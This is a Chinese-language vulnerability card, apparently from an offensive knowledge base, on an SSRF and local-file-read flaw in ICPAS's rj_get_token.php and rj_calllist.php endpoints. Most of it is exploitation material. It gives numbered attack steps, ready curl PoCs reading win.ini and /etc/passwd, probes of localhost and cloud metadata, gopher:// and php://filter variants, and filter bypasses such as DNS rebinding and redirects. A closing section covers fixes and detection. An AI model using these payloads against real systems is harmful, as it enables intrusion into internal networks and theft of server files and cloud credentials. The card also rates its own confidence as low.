---
id: web-generic-ssrf-icpas-rj-get-token-file-scheme
title: ICPAS php/rj_get_token.php 与 rj_calllist.php 的 URL 未限制协议：file:// 本地文件读取与内网 SSRF
type: scenario
domain: web
path: web/generic/ssrf
technique: icpas-rj-url-file-scheme-ssrf
aliases:
- ICPAS SSRF
- IP 网络对讲广播系统 SSRF
- rj_get_token file://
- rj_calllist curl_exec
- url=file:///c:/windows/win.ini
tags:
- php
- ssrf
- file-scheme
- arbitrary-file-read
- curl
- file-get-contents
- icpas
cve: []
severity: high
confidence: low
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V222
  verified_at: '2026-11-07T07:07:29+08:00'
  notes: 已对照原文 AI 审计表 rj_get_token.php file_get_contents 与 rj_calllist.php curl_exec 截图核对；file:// 读取与内网 SSRF 路径成立，但原文未展示 rj_get_token 函数体或回显，confidence low 合理；与已有 PHP curl file:// 卡入口/产品不同。
---

## 一句话结论

ICPAS 的 `php/rj_get_token.php`（以及 AI 审计报告中的 `php/rj_calllist.php`）把用户提交的 `url` 直接交给 `file_get_contents`/`curl_exec`，没有限制协议或目标主机；传入 `file:///c:/windows/win.ini` 可读取服务器本地文件，传入内网地址可形成 SSRF 探测内网服务。

## 原理

- 原文 AI 审计表把 `php/rj_get_token.php` 列为“SSRF/本地文件读取”：任意 URL 直接传给 `file_get_contents`，PoC 为 `url=file:///c:/windows/win.ini`。
- AI 报告的 `rce.txt`/`SSRF.txt` 中另给出 `WWW\php\rj_calllist.php` 第 25 行 `$res = curl_exec($url);`，请求体形如 `jsondata={"url":"http://内网IP/敏感路径","type":"calllist"}`；`curl_exec` 未设置 `CURLOPT_PROTOCOLS`/`CURLOPT_REDIR_PROTOCOLS` 或主机白名单。
- `file_get_contents` 和 libcurl 默认都可能支持 `file://`/`http://` 等协议；`file://` 会读取服务器本地文件并（视实现）回显，`http://` 则让服务器向攻击者指定地址发起请求，可探测内网与云元数据。
- 注意：原文只给出审计表/AI 报告，没有展示 `rj_get_token.php` 的函数体；`rj_calllist.php` 的 `curl_exec` 有截图但未验证回显，因此置信度标 low。

## 触发条件

- `php/rj_get_token.php` 或 `php/rj_calllist.php` 可访问，接受用户控制的 URL 参数（`url` 或 `jsondata[url]`）。
- PHP 启用 `allow_url_fopen`（file_get_contents 路径）或 curl 扩展（curl_exec 路径）。
- libcurl/PHP 未禁用 `file://` 协议；目标文件路径已知（Windows 可先读 `c:/windows/win.ini` 验证）。

## 利用步骤

1. 抓取 `rj_get_token.php`/`rj_calllist.php` 的正常请求，确认参数名（`url` 或 `jsondata[url]`）与响应格式。
2. 传 `file:///c:/windows/win.ini`（Windows）或 `file:///etc/passwd`（Linux）验证本地文件读取。
3. 传 `http://127.0.0.1:<port>/`、内网网段地址或云元数据地址（如 `http://169.254.169.254/latest/meta-data/`）探测内网。
4. 若回显受限，可用时间盲注/不同响应长度判断；读取配置后可衔接后台登录或其它漏洞。

## PoC

```bash
# 本地文件读取
curl -s -X POST 'http://target/php/rj_get_token.php' \
  --data-urlencode 'url=file:///c:/windows/win.ini'

# 内网探测（rj_calllist 形式）
curl -s -X POST 'http://target/php/rj_calllist.php' \
  --data-urlencode 'jsondata={"url":"http://127.0.0.1:8080/","type":"calllist"}'
```

## 变体与关联

- **协议变体**：`php://filter/convert.base64-encode/resource=...` 读源码、`gopher://`/`dict://` 打内网（取决于 curl 编译协议）。
- **绕过变体**：若后续版本限制 IP/域名，可尝试十进制/八进制 IP、`0.0.0.0`、DNS 重绑定、302 跳转等。
- **关联**：与现有 [[web-generic-ssrf-php-curl-get-file-scheme-config-read]] 属同一类 PHP URL 包装器 SSRF，但入口、参数与产品环境不同；本卡保留 ICPAS 的具体端点与 PoC 供产品侧复用。

## 检测与防御

- **修复**：协议白名单仅允许 `http/https`；解析并校验目标 IP 不属于内网/保留网段（防 DNS 重绑定）；禁止跟随跳转到内网；必要时只允许固定域名。
- **加固**：`allow_url_fopen=Off`、curl 设置 `CURLOPT_PROTOCOLS`/`CURLOPT_REDIR_PROTOCOLS`；出站流量走代理并做目的地址审计。
- **检测**：监控请求参数中出现 `file://`、`php://`、`gopher://`、内网 IP、云元数据地址；审计 Web 进程的出站连接。
